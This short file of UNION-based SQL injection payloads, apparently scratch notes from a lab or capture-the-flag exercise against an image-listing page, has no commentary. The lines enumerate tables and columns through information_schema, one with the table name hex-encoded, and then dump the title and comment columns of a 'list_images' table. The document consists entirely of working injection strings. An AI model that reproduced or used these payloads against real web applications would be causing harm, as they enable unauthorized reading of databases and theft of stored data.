

images

1 UNION SELECT table_name, null FROM information_schema.tables
1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 0x6c6973745f696d61676573--

1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = list_images --

1 UNION SELECT title, null FROM list_images--
1 UNION SELECT comment, null FROM list_images--

1 UNION SELECT comment, null FROM list_images-- 